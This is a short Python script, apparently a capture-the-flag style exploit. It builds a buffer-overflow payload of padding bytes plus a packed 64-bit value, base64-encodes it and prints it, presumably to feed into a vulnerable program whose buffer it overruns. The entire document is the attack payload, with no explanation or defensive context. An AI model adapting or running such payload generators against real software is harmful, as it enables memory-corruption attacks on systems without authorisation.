
import sys
import struct
import base64

buf = b'ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ'
buf += struct.pack('<Q', 15551058721431020714)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
